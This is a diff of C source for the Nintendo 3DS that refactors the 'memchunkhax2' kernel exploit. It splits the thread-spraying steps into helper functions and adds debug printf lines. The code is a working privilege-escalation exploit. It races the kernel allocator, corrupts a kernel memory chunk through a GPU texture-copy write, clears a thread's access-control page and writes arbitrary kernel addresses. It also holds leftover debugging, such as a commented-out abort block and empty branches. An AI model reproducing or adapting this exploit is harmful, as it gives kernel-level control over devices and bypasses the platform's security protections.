@@ -197,6 +197,89 @@ static u32 get_threads_limit(void)
    return thread_limit_max - thread_limit_current;
 }
 
+static void create_check_tls_threads(mch2_vars_t *mch2) {
+   int i;
+   for (i = 0; i < mch2->threads_limit; i++)
+   {
+      svcCreateThread(&mch2->threads[i].handle,
+                      (ThreadFunc)check_tls_thread_entry,
+                      (u32)&mch2->threads[i].keep,
+                      mch2->threads[i].stack_top, 0x18, 0);
+      svcWaitSynchronization(mch2->threads[i].handle, U64_MAX);
+   }
+   for (i = 0; i < mch2->threads_limit; i++) {
+      if (!mch2->threads[i].handle) {
+      }
+      if (mch2->threads[i].keep) {
+         continue;
+      }
+      svcCloseHandle(mch2->threads[i].handle);
+   }
+   printf("create_check_tls_threads done\n");
+}
+
+static void create_dummy_threads(mch2_vars_t *mch2) {
+   int i;
+
+   svcCreateEvent(&mch2->dummy_threads_lock, 1);
+   svcClearEvent(mch2->dummy_threads_lock);
+
+   // closed dummy thread
+   for (i = 0; i < mch2->threads_limit; i++) {
+      if (mch2->threads[i].keep)
+         continue;
+
+      svcCreateThread(&mch2->threads[i].handle,
+                      (ThreadFunc)dummy_thread_entry,
+                      mch2->dummy_threads_lock,
+                      mch2->threads[i].stack_top, 0x3F - i, 0);
+   }
+
+   // join threads message
+   svcSignalEvent(mch2->dummy_threads_lock);
+
+   for (i = mch2->threads_limit - 1; i >= 0; i--) {
+      if (mch2->threads[i].keep)
+         continue;
+      svcWaitSynchronization(mch2->threads[i].handle, U64_MAX);
+      svcCloseHandle(mch2->threads[i].handle);
+      mch2->threads[i].handle = 0;
+   }
+
+   svcCloseHandle(mch2->dummy_threads_lock);
+   printf("create_dummy_threads done\n");
+}
+
+static void create_target_thread(mch2_vars_t *mch2, mch2_thread_t *thread) {
+   thread->args.started_event = mch2->main_thread_lock;
+   thread->args.lock = mch2->target_threads_lock;
+   thread->args.target_kaddr = 0;
+
+   svcClearEvent(mch2->main_thread_lock);
+   svcCreateThread(&thread->handle, (ThreadFunc)target_thread_entry,
+                   (u32)&thread->args, thread->stack_top, 0x18, 0);
+   svcWaitSynchronization(mch2->main_thread_lock, U64_MAX);
+}
+
+static void close_not_keep_target_threads(mch2_vars_t *mch2) {
+   int i;
+
+   svcSignalEvent(mch2->target_threads_lock);
+
+   for (i = 0; i < mch2->threads_limit; i++)
+   {
+      if (!mch2->threads[i].handle)
+         continue;
+
+      if (!mch2->threads[i].keep)
+         svcWaitSynchronization(mch2->threads[i].handle, U64_MAX);
+
+      svcCloseHandle(mch2->threads[i].handle);
+   }
+
+   svcCloseHandle(mch2->target_threads_lock);
+}
+
 static void do_memchunkhax2(void)
 {
    static u8 flush_buffer[0x8000];
@@ -219,41 +302,24 @@ static void do_memchunkhax2(void)
    APT_SetAppCpuTimeLimit(5);
    aptCloseSession();
 
-   for (i = 0; i < mch2.threads_limit; i++)
-   {
-      svcCreateThread(&mch2.threads[i].handle, (ThreadFunc)check_tls_thread_entry, (u32)&mch2.threads[i].keep,
-                      mch2.threads[i].stack_top, 0x18, 0);
-      svcWaitSynchronization(mch2.threads[i].handle, U64_MAX);
-   }
-
-   for (i = 0; i < mch2.threads_limit; i++)
-      if (!mch2.threads[i].keep)
-         svcCloseHandle(mch2.threads[i].handle);
-
-   svcCreateEvent(&mch2.dummy_threads_lock, 1);
-   svcClearEvent(mch2.dummy_threads_lock);
-
-   for (i = 0; i < mch2.threads_limit; i++)
-      if (!mch2.threads[i].keep)
-         svcCreateThread(&mch2.threads[i].handle, (ThreadFunc)dummy_thread_entry, mch2.dummy_threads_lock,
-                         mch2.threads[i].stack_top, 0x3F - i, 0);
-
-   svcSignalEvent(mch2.dummy_threads_lock);
-
-   for (i = mch2.threads_limit - 1; i >= 0; i--)
-      if (!mch2.threads[i].keep)
-      {
-         svcWaitSynchronization(mch2.threads[i].handle, U64_MAX);
-         svcCloseHandle(mch2.threads[i].handle);
-         mch2.threads[i].handle = 0;
-      }
-
-   svcCloseHandle(mch2.dummy_threads_lock);
+   create_check_tls_threads(&mch2);
+   create_dummy_threads(&mch2);
 
    u32 fragmented_address = 0;
 
    mch2.arbiter = __sync_get_arbiter();
+   printf("arbiter: 0x%x\n", mch2.arbiter);
 
+   /*
+   if (mch2.arbiter > 0x7c0000) {
+     printf("oops!!?\n");
+     close_not_keep_target_threads(&mch2);
+     aptOpenSession();
+     APT_SetAppCpuTimeLimit(mch2.old_cpu_time_limit);
+     aptCloseSession();
+     return;
+   }
+   */
    u32 linear_buffer;
    svcControlMemory(&linear_buffer, 0, 0, 0x1000, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE);
 
@@ -285,6 +351,7 @@ static void do_memchunkhax2(void)
    u32 alloc_address_kaddr = osConvertVirtToPhys((void*)linear_address) + mch2.kernel_fcram_mapping_offset;
 
    mch2.thread_page_kva = get_first_free_basemem_page(mch2.isNew3DS) - 0x10000; // skip down 16 pages
+   printf("kva: 0x%x\n", mch2.thread_page_kva);
    ((u32*)linear_buffer)[0] = 1;
    ((u32*)linear_buffer)[1] = mch2.thread_page_kva;
    ((u32*)linear_buffer)[2] = alloc_address_kaddr + (((mch2.alloc_size >> 12) - 3) << 13) + (skip_pages << 12);
@@ -296,25 +363,33 @@ static void do_memchunkhax2(void)
    GSPGPU_InvalidateDataCache((void*)dst_memchunk, 16);
    GSPGPU_FlushDataCache((void*)linear_buffer, 16);
    memcpy(flush_buffer, flush_buffer + 0x4000, 0x4000);
-   svcClearEvent(gspEvents[GSPGPU_EVENT_PPF]);
 
    svcCreateThread(&mch2.alloc_thread, (ThreadFunc)alloc_thread_entry, (u32)&mch2,
                    mch2.threads[MCH2_THREAD_COUNT_MAX - 1].stack_top, 0x3F, 1);
 
+   printf("mch2.alloc_address: 0x%x\n", mch2.alloc_address);
    while ((u32) svcArbitrateAddress(mch2.arbiter, mch2.alloc_address, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0,
                                     0) == 0xD9001814);
 
+   svcClearEvent(gspEvents[GSPGPU_EVENT_PPF]);
    GX_TextureCopy((void*)linear_buffer, 0, (void*)dst_memchunk, 0, 16, 8);
-   memcpy(flush_buffer, flush_buffer + 0x4000, 0x4000);
    svcWaitSynchronization(gspEvents[GSPGPU_EVENT_PPF], U64_MAX);
+   printf("call gspwn done\n");
+
+   memcpy(flush_buffer, flush_buffer + 0x4000, 0x4000);
 
    svcWaitSynchronization(mch2.alloc_thread, U64_MAX);
+   printf("alloc thread wait done\n");
    svcCloseHandle(mch2.alloc_thread);
+   printf("alloc thread close done\n");
+
+   printf("alloc_thread_entry done\n");
 
    u32* mapped_page = (u32*)(mch2.alloc_address + mch2.alloc_size - 0x1000);
 
    volatile u32* thread_ACL = &mapped_page[THREAD_PAGE_ACL_OFFSET >> 2];
 
+   printf("main thread event start\n");
    svcCreateEvent(&mch2.main_thread_lock, 0);
    svcCreateEvent(&mch2.target_threads_lock, 1);
    svcClearEvent(mch2.target_threads_lock);
@@ -324,18 +399,15 @@ static void do_memchunkhax2(void)
       if (mch2.threads[i].keep)
          continue;
 
-      mch2.threads[i].args.started_event = mch2.main_thread_lock;
-      mch2.threads[i].args.lock = mch2.target_threads_lock;
-      mch2.threads[i].args.target_kaddr = 0;
+      //mch2.threads[i].args.started_event = mch2.main_thread_lock;
+      //mch2.threads[i].args.lock = mch2.target_threads_lock;
+      //mch2.threads[i].args.target_kaddr = 0;
 
       thread_ACL[0] = 0;
       GSPGPU_FlushDataCache((void*)thread_ACL, 16);
       GSPGPU_InvalidateDataCache((void*)thread_ACL, 16);
 
-      svcClearEvent(mch2.main_thread_lock);
-      svcCreateThread(&mch2.threads[i].handle, (ThreadFunc)target_thread_entry, (u32)&mch2.threads[i].args,
-                      mch2.threads[i].stack_top, 0x18, 0);
-      svcWaitSynchronization(mch2.main_thread_lock, U64_MAX);
+      create_target_thread(&mch2, &mch2.threads[i]);
 
       if (thread_ACL[0])
       {
@@ -349,21 +421,10 @@ static void do_memchunkhax2(void)
 
    }
 
-   svcSignalEvent(mch2.target_threads_lock);
+   close_not_keep_target_threads(&mch2);
 
-   for (i = 0; i < mch2.threads_limit; i++)
-   {
-      if (!mch2.threads[i].handle)
-         continue;
-
-      if (!mch2.threads[i].keep)
-         svcWaitSynchronization(mch2.threads[i].handle, U64_MAX);
-
-      svcCloseHandle(mch2.threads[i].handle);
-   }
-
-   svcCloseHandle(mch2.target_threads_lock);
    svcCloseHandle(mch2.main_thread_lock);
+   printf("main thread event done\n");
 
    svcControlMemory(&tmp, mch2.alloc_address, 0, mch2.alloc_size, MEMOP_FREE, MEMPERM_DONTCARE);
    write_kaddr(alloc_address_kaddr + linear_size - 0x3000 + 0x4, alloc_address_kaddr + linear_size - 0x1000);
